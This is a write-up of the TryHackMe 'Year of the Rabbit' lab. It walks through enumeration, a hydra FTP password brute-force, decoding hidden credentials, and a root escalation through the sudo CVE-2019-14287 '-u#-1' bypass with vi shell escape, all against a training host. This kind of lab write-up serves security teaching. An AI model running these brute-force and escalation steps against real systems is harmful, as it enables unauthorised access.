[Home](../../index.md)

# TryHackMe: Year of the Rabbit

https://tryhackme.com/room/yearoftherabbit

---
## Enumeration

Port scans

```
┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ rustscan -a 10.10.140.107 -r 1-65535               

Open 10.10.140.107:22
Open 10.10.140.107:21
Open 10.10.140.107:80

┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ nmap -p 21,22,80 -sV -sC 10.10.140.107

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

---
### FTP

Checked to see if FTP anonymous login was allowed, no luck.

---
### HTTP

Browsing to `http://10.10.140.107` shows us the default Apache Debian page.

Running `feroxbuster` reveals an `/assets` directory.

```
┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ sudo feroxbuster -u http://10.10.140.107 -w /usr/share/wordlists/dirb/big.txt -x php,txt

301        9l       28w      315c http://10.10.140.107/assets
```

Browsing there gets us the below files.

```
Index of /assets
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[VID]	RickRolled.mp4	2020-01-23 00:34 	384M	 
[TXT]	style.css	2020-01-23 00:34 	2.9K	 
Apache/2.4.10 (Debian) Server at 10.10.140.107 Port 80
```

`style.css` has a secret message.

```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

Browsing to `/sup3r_s3cr3t_fl4g.php` first gives a pop-up telling us to turn off our javascript, and then it redirects us to a YouTube rick roll.

If I view the source, here is the real message:

```
<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
```

Sounds like we are going to have to watch that rick roll video in `/assets`.

About a minute in it gives us a message that we're looking in the wrong place.  We watch the rest of the video because we trust no one.  There's nothing else there.

Let's fire up Burpsuite and start looking at traffic as you browse to all the pages.  Turns out when we go to `/sup3r_s3cr3t_fl4g.php`, it makes another request.

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.140.107
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Let's check out `/WExYY2Cv-qU`

```
Index of /WExYY2Cv-qU
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[IMG]	Hot_Babe.png	2020-01-23 00:34 	464K	 
Apache/2.4.10 (Debian) Server at 10.10.140.107 Port 80
```

Hot_Babe.png is a picture of what appears to be a lady (I never know anymore).  This stinks of steganography.

Running `exiftool` on it gives us nothing.

Running `steghide` informs us that the format is not supported.

Running `strings` gets us the ftpusername and a wordlist of possible passwords.

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?

...lots more...
```

---
## Back to FTP

Let's copy the passwords into a wordlist and run `hydra`.

```
┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ hydra -l ftpuser -P hotstrings.txt 10.10.140.107 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-21 10:25:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.140.107:21/
[21][ftp] host: 10.10.140.107   login: ftpuser   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-21 10:25:30
```

Now let's look at FTP.

```
┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ ftp 10.10.140.107   
Connected to 10.10.140.107.
220 (vsFTPd 3.0.2)
Name (10.10.140.107:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||55039|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
```

```
┌──(kali㉿kali)-[~/tryhackme/yearoftherabbit]
└─$ cat Eli\'s_Creds.txt                          
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

Nothing can ever be simple.

This is an [Esoteric Programming Language](https://youtu.be/cQ7bcCrJMHc) called BrainFuck.  I found an interpreter [Here](https://www.nayuki.io/page/brainfuck-interpreter-javascript).  It gives us a user and password as the output of the program.

```
User: eli
Password: <redacted>
```

These are SSH creds!!!!

## Lateral Movement

`user.txt` is not ours yet.  It lives in `/home/gwendoline`, the other user on this system.

```
eli@year-of-the-rabbit:/$ find / -type f -name "user.txt" 2>/dev/null
/home/gwendoline/user.txt
eli@year-of-the-rabbit:/$ ls /home
eli  gwendoline
```

There's a message to `gwendoline` from `root` when we log in.

```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

Let's search for s3cr3t

```
eli@year-of-the-rabbit:~$ find / -name "*s3cr3t*" 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just <redacted>
Honestly!

Yours sincerely
   -Root
```

Now we have `gwendoline`'s password.

## Privilege Escalation

Checking `sudo -l` reveals that we can edit `user.txt` with `vi` as any user other than root.

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

If we could [somehow run it as UID 0 without technically being root](https://nvd.nist.gov/vuln/detail/CVE-2019-14287), we could use `vi` to escalate.

If you check `sudo -V`, our version is vulnerable.

```
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
(type :!/bin/sh in vi)
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<redacted>
# exit
```